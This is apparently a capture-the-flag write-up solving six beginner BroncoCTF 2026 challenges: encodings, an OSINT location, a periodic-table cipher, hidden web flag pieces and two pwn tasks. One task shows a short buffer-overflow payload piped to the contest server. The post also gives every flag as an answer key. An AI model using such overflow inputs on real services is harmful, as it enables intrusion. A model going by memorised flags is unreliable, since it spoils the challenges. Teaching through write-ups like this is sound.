---
layout: post
title:  "Beginner Challenges"
date:   2026-07-12 12:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /bronco-CTF-2026-beginner/
---
* TOC
{:toc}

## No Laughing Matter

**Category**: misc

**Author**: yoshie878

**Description**: You see, that's not funny.

I get the file `aha.txt`:
```shell
cat aha.txt  
AHHAAAHA AHHHAAHA AHHAHHHH AHHAHHHA AHHAAAHH AHHAHHHH AHHHHAHH AHAHAHAH AHAAAHHA AHAHAHAH AHAAHHHA AHAAHHHA AHAHHAAH AHAAHHAA AHAAHHAH AHAAAAAH AHAAHHHH AHAAHHAA AHAAHHHH AHAAHHAA AHAHHAAA AHAAAHAA AHAAHAAH AHAAHAHA AHAAAAHA AHAAHHHH AHAAHHAA AHAHAAHA AHAAHHHH AHAAAHHA AHAAHHAA AHAAHAAA AHAAAAAH AHAAHAAA AHAAAAAH AHHHHHAH
```

On cyberchef I did the recipe `find/replace A with 0` and `find/replace H with 1`, then `from binary`.

[cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'A'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'H'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=QUhIQUFBSEEgQUhISEFBSEEgQUhIQUhISEggQUhIQUhISEEgQUhIQUFBSEggQUhIQUhISEggQUhISEhBSEggQUhBSEFIQUggQUhBQUFISEEgQUhBSEFIQUggQUhBQUhISEEgQUhBQUhISEEgQUhBSEhBQUggQUhBQUhIQUEgQUhBQUhIQUggQUhBQUFBQUggQUhBQUhISEggQUhBQUhIQUEgQUhBQUhISEggQUhBQUhIQUEgQUhBSEhBQUEgQUhBQUFIQUEgQUhBQUhBQUggQUhBQUhBSEEgQUhBQUFBSEEgQUhBQUhISEggQUhBQUhIQUEgQUhBSEFBSEEgQUhBQUhISEggQUhBQUFISEEgQUhBQUhIQUEgQUhBQUhBQUEgQUhBQUFBQUggQUhBQUhBQUEgQUhBQUFBQUggQUhISEhIQUg)

`bronco{UFUNNYLMAOLOLXDIJBOLROFLHAHA}`

___

## Digital Crumbs

**Category**: osint

**Author**: tiffany_ttn

**Description**: My friends just sent me this picture of a coffee place they were at and told me to meet them at the pizza store across the street. What is the building number of that pizza shop?

Hint: Flag should be in the format `bronco{XXXX}`, where `XXXX` is the building number.

I get `CoffeeMill.jpg`:

![Alt text](/images/CoffeeMill.jpg)

The location is easy to find. I went to street view on google maps and saw the street number of the building accross the street: [google maps link](https://www.google.com/maps/place/3363+Grand+Ave,+Oakland,+CA+94610,+USA/@37.8138079,-122.2467039,6a,15y,125.81h,92.02t/data=!3m7!1e1!3m5!1szQxmHZVr1gLslIkHGhcOaA!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-2.01509994456066%26panoid%3DzQxmHZVr1gLslIkHGhcOaA%26yaw%3D125.80533128835262!7i16384!8i8192!4m15!1m8!3m7!1s0x808f874312bf1301:0x46a1644510c9baa4!2s3363+Grand+Ave,+Oakland,+CA+94610,+USA!3b1!8m2!3d37.8137381!4d-122.2468805!16s%2Fg%2F11c15vnl7q!3m5!1s0x808f874312bf1301:0x46a1644510c9baa4!8m2!3d37.8137381!4d-122.2468805!16s%2Fg%2F11c15vnl7q?entry=ttu&g_ep=EgoyMDI2MDcwOC4wIKXMDSoASAFQAw%3D%3D)

`bronco{3360}`

___

## Negative Bread

**Category**: pwn

**Author**: .tidalw

**Description**: Your account starts at $100. The flag costs $1,000,000. Deposits are capped. Withdrawals can't go below zero.

No _strings_ attached.

We don't even need to guard the vault. This bank is impenetrable!

I get the binary `bank`:
```shell
file bank  
bank: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=beaa5391802e9d0ceac6040931ec7c630cec2a69, for GNU/Linux 3.2.0, not stripped

strings bank | grep bronco  
bronco{th3_b4nk_0w3s_m3_m0n3y}
```

`bronco{th3_b4nk_0w3s_m3_m0n3y}`

___

## Atomic Substitution Theory

**Category**: misc

**Author**: tiffany_ttn

**Description**: This text file is what happens when a chemist tries to send you a top secret message.

Hint: all letters in the flag should be lowercase.

I get the file `secret.txt`:
```shell
cat secret.txt  
(4, 17), (2, 16), (2, 15), (4, 9), { , (3, 2, 1), (5, 3), _ , (2, 17), (3, 13, 1), (4, 5), (2, 16), (4, 17, 2), (2, 1, 2), (4, 4, 1), (2, 2, 2), _ , (3, 2, 1), (2, 2, 2), (3,16), (3, 16), (3, 13, 1), (4, 13, 1), (2, 2, 2), (3, 16), _ , (1, 1), (3, 13, 1), (4, 5), (2, 2, 2), _ , (3, 13, 1), (4, 4, 1), _ , (2, 2, 2), (3, 17, 2), (2, 2, 2), (3, 2, 1), (2, 2, 2), (2, 15), (4, 4, 1), _ , (2, 16), (2, 17), _ , (3, 16), (9, 6), (3, 15), (4, 17, 2), (2, 1, 2), (3, 16), (2, 2, 2), }
```

The periodic table is organized by: period = row, group = column

Example:
```
(4,17)
```
means: period 4, group 17

That element is:
```
Br = Bromine
```

This python decodes most of it:
```python
python3  
Python 3.13.5 (main, Jun 13 2026, 14:18:01) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> elements = {  
...     (4,17): 'Br', (2,16): 'O', (2,15): 'N', (4,9): 'Co',  
...     (3,2): 'Mg', (5,3): 'Y', (2,17): 'F', (3,13): 'Al',  
...     (4,5): 'V', (2,1): 'Li', (4,4): 'Ti', (2,2): 'Be',  
...     (4,13): 'Ga', (1,1): 'H', (3,17): 'Cl', (3,16): 'S',  
...     (3,15): 'P', (9,6): 'U' 
... }  
...  
... cipher = [  
...     (4,17), (2,16), (2,15), (4,9), '{',  
...     (3,2,1), (5,3), '_',  
...     (2,17), (3,13,1), (4,5), (2,16), (4,17,2), (2,1,2), (4,4,1), (2,2,2), '_',  
...     (3,2,1), (2,2,2), (3,16), (3,16), (3,13,1), (4,13,1), (2,2,2), (3,16), '_',  
...     (1,1), (3,13,1), (4,5), (2,2,2), '_',  
...     (3,13,1), (4,4,1), '_',  
...     (2,2,2), (3,17,2), (2,2,2), (3,2,1), (2,2,2), (2,15), (4,4,1), '_',  
...     (2,16), (2,17), '_',  
...     (3,16), (9,6), (3,15), (4,17,2), (2,1,2), (3,16), (2,2,2), '}'  
... ]  
...  
... def decode(t):  
...     if isinstance(t, str):  
...         return t  
...     if len(t) == 2:  
...         return elements.get(t, '?')  
...     elif len(t) == 3:  
...         sym = elements.get((t[0], t[1]), '?')  
...         idx = t[2] - 1  
...         return sym[idx] if 0 <= idx < len(sym) else '?'  
...     return '?'  
...  
... flag = ''.join(decode(t) for t in cipher).lower()  
... print(flag)  
...  
bronco{my_favorite_messages_have_at_element_of_suprise}  
>>> exit
```

I needed to fix the flag manually a little. 

`bronco{my_favorite_messages_have_an_element_of_surprise}`

___

## The Keymaster

**Category**: web

**Author**: yoshie878

**Description**: The Keymaster has split a flag into 8 keys and hid them in plain sight.

Quite literally, as they're on our advertisement page!

Ready your _cursor-pointers_, pull out your trusty _inspection panel_, and find them quickly, detective!

`https://broncosec.com/BroncoCTF`

I just had to explore this page to find the eight pieces to the flag:
```shell
1 - bronco{h
2 - 3y_y0u_f
3 - 0und_th3
4 - m_4ll_w1
5 - th_4b501
6 - ut31y_n0
7 - _w0rr135
8 - _4t_411}
```

7 was on `/7.txt`. 4 was in a cookie. 2 and 5 were in the javascript.

`bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}`

___

## Pwntorial

**Category**: pwn

**Author**: yoshie878

**Description**: I've gotten complaints that BroncoCTF has no PWN. But, I think the more important issue is that our students don't know _HOW_ to PWN!

Behold: the PWNTORIAL. This'll solve all your pwn knowledge holes!

[Google Docs: The Pwntorial](https://docs.google.com/document/d/e/2PACX-1vTCF6gP7mStNb8FYbWCk6cDHn7wk3XtcnfA2VH25D-LXXDX6brC-DqyK-bNriCYdxk9nXAUgPLBfnuT/pub)

_...yeah it's just an AI Slop Google Doc but surely that's enough to educate college students nowadays, right?_

`snicat broncoctf-pwntorial.chals.io`

`nc 0.cloud.chals.io 19476`

```shell
python3 -c "print('A'*128 + 'BBBB')" | nc 0.cloud.chals.io 19476  
  
[+] SUCCESS! Welcome inside, aspiring pwner!  
bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}
```

`bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}`
